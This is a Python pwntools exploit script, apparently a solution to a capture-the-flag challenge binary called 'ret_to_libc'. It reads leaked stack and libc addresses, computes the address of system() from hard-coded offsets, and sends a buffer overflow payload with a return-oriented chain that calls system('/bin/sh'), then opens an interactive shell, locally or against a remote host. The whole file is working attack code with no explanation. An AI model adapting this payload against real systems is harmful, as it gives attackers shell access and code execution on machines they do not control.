from pwn import *
import time
import sys


def exploit():
    raw_input('wait')
    proc.recvuntil('buffer address: ')
    overflowme_adr = int(proc.recvline(), 16)
    proc.recvuntil('__libc_start_main address: ')
    libc_base = int(proc.recvline(), 16) - 0x20830
    system_adr = libc_base + 0x45390
    pop_rdi = 0x400653
    raw_input('wait')
    buf = 'A' * (cyclic_find('jaab') - 8)
    buf += '/bin/sh\x00'
    buf += flat(pop_rdi, overflowme_adr + buf.find('/bin/sh'), system_adr)
    proc.sendline(buf)


if __name__ == '__main__':
    context.arch = 'amd64'
    connect = 'nc localhost port'
    connect = connect.split(' ')
    if len(sys.argv) > 1:
        proc = remote(connect[1], int(connect[2]))
    else:
        proc = process(['./ret_to_libc'], env={'LD_LIBRARY_PATH': './'})
    exploit()
    proc.interactive()
